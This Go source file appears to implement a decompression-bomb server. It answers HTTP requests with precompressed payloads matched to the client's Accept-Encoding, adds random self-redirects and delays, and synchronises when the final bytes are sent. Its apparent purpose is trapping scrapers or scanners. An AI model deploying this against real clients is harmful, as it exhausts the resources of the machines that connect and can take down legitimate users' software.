package server

import (
	"bytes"
	"fmt"
	"log/slog"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type Server struct {
	payloads  *Payloads
	barrier   *barrier
	indexPath string
}

type barrier struct {
	mu   sync.Mutex
	done chan struct{}
}

func newBarrier() *barrier {
	b := &barrier{done: make(chan struct{})}
	go b.monitor()
	return b
}

func (b *barrier) monitor() {
	for {
		time.Sleep(3 * time.Second)
		c := b.done
		nextc := make(chan struct{})
		b.mu.Lock()
		b.done = nextc
		b.mu.Unlock()
		close(c)
	}
}

func (b *barrier) wait(conn net.Conn) {
	b.mu.Lock()
	done := b.done
	b.mu.Unlock()
	<-done
}

func NewServer(payloads *Payloads, indexPath string) *Server {
	return &Server{
		payloads:  payloads,
		barrier:   newBarrier(),
		indexPath: indexPath,
	}
}

func makeHeader(status, pAddr, tstr, encoding string) []byte {
	loc := ""
	if pAddr != "" {
		loc = fmt.Sprintf("Location: http://%s/%s\n", pAddr, tstr)
	}
	return []byte(fmt.Sprintf("HTTP/1.1 %s\n%sContent-Type: text/html\r\nContent-Encoding: %s\n\n", status, loc, encoding))
}

func hdr200(encoding string) []byte {
	return []byte(fmt.Sprintf("HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\r\nContent-Encoding: %s\n\n", encoding))
}

func hdr302(pAddr string, tstr string, encoding string) []byte {
	return makeHeader("302 Found", pAddr, tstr, encoding)
}

func sendFile(conn net.Conn, payloads *Payloads, encoding string, waitf func()) error {
	trimFn, last4 := payloads.SelectPayload(encoding)
	f, err := os.Open(trimFn)
	if err != nil {
		return err
	}
	slog.Info("sending payload", "file", trimFn)
	defer f.Close()
	_, err = (conn.(*net.TCPConn)).ReadFrom(f)
	if err != nil {
		return err
	}
	waitf()
	_, err = conn.Write(last4)
	return err
}

func detectEncoding(buf []byte) string {
	idx := bytes.Index(buf, []byte("Accept-Encoding:"))
	if idx == -1 {
		return "gzip"
	}
	val := buf[idx+len("Accept-Encoding:"):]
	endIdx := bytes.IndexByte(val, '\n')
	if endIdx == -1 {
		endIdx = len(val)
	}
	if endIdx > 0 && val[endIdx-1] == '\r' {
		endIdx--
	}
	seen := make(map[string]bool)
	for _, token := range strings.Split(strings.ToLower(string(val[:endIdx])), ",") {
		seen[strings.TrimSpace(token)] = true
	}
	if seen["br"] {
		return "br"
	}
	if seen["zstd"] {
		return "zstd"
	}
	if seen["gzip"] {
		return "gzip"
	}
	return "gzip"
}

func isGetRoot(buf []byte) bool {
	endIdx := bytes.IndexByte(buf, '\n')
	if endIdx == -1 {
		endIdx = len(buf)
	}
	if endIdx > 0 && buf[endIdx-1] == '\r' {
		endIdx--
	}
	line := strings.TrimRight(string(buf[:endIdx]), "\r")
	spaceIdx := strings.IndexByte(line, ' ')
	if spaceIdx == -1 || !strings.HasPrefix(line, "GET ") {
		return false
	}
	secondSpace := strings.IndexByte(line[spaceIdx+1:], ' ')
	if secondSpace == -1 {
		return false
	}
	path := line[spaceIdx+1 : spaceIdx+1+secondSpace]
	qIdx := strings.IndexByte(path, '?')
	if qIdx != -1 {
		path = path[:qIdx]
	}
	return path == "/"
}

func (s *Server) serveIndex(conn net.Conn) error {
	f, err := os.Open(s.indexPath)
	if err != nil {
		return err
	}
	defer f.Close()
	fi, err := f.Stat()
	if err != nil {
		return err
	}
	hdr := []byte(fmt.Sprintf("HTTP/1.1 200 OK\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n", fi.Size()))
	if _, err := conn.Write(hdr); err != nil {
		return err
	}
	_, err = (conn.(*net.TCPConn)).ReadFrom(f)
	return err
}

func (s *Server) bomb(conn net.Conn, pAddr string) error {
	defer conn.Close()
	slog.Info("serving", "addr", (conn.(*net.TCPConn)).RemoteAddr())

	// Read up to 4096 bytes of HTTP headers.
	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	slog.Info("headers", "addr", (conn.(*net.TCPConn)).RemoteAddr(), "data", string(buf[:n]))

	// Check for GET / index request.
	if s.indexPath != "" && isGetRoot(buf[:n]) {
		slog.Info("serving index", "addr", (conn.(*net.TCPConn)).RemoteAddr())
		return s.serveIndex(conn)
	}

	encoding := detectEncoding(buf[:n])

	// Stall some to pretend the client request is being processed.
	time.Sleep(time.Duration((rand.Float64() + 0.01) * float64(time.Second)))

	// Randomly choose to redirect.
	var hdr []byte
	if rand.Intn(2) == 0 {
		hdr = hdr200(encoding)
		slog.Info("redirect", "addr", (conn.(*net.TCPConn)).RemoteAddr(), "type", "200", "encoding", encoding)
	} else {
		tstr := fmt.Sprintf("%v", time.Now().UnixNano())
		hdr = hdr302(pAddr, tstr, encoding)
		slog.Info("redirect", "addr", (conn.(*net.TCPConn)).RemoteAddr(), "type", "302", "encoding", encoding)
	}
	if _, err := conn.Write(hdr); err != nil {
		return err
	}

	// Barrier: wait 3 seconds for other connections, then send.
	var waitf func()
	randomSleep := rand.Intn(5) == 0
	if randomSleep {
		waitf = func() {}
	} else {
		waitf = func() { s.barrier.wait(conn) }
	}

	if err := sendFile(conn, s.payloads, encoding, waitf); err != nil {
		return err
	}

	// Randomly sleep.
	slog.Info("served", "addr", (conn.(*net.TCPConn)).RemoteAddr())
	if randomSleep {
		slog.Info("sleeping", "addr", (conn.(*net.TCPConn)).RemoteAddr())
		time.Sleep(20 * time.Second)
	}
	return nil
}

func (s *Server) Serve(ln net.Listener, pAddr string) error {
	slog.Info("listening", "addr", ln.Addr().String(), "publish", pAddr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			slog.Error("accept error", "err", err)
			continue
		}
		go func() {
			if err := s.bomb(conn, pAddr); err != nil {
				slog.Error("bomb error", "err", err)
			}
		}()
	}
}
